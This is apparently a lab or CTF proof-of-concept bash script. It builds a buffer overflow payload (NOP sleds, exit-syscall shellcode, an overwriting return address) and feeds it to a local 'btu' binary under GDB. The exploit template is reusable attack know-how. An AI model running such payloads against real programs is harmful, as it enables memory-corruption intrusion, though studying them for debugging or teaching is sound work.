#!/bin/bash

# Generate the payload using Python
PAYLOAD=$(python3 -c "import sys; sys.stdout.buffer.write(
    b'\x90'*21 +                         # NOP sled
    b'\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80' +  # shellcode
    b'\x90'*21 +                         # NOP sled
    b'\x6a\xcd\xff\xff'                 # overwritten return address or similar
)")

# Launch GDB with the binary and crafted payload as arguments
gdb -q ./build/bin/btu --args ./build/bin/btu remove 1782914303 "$PAYLOAD"
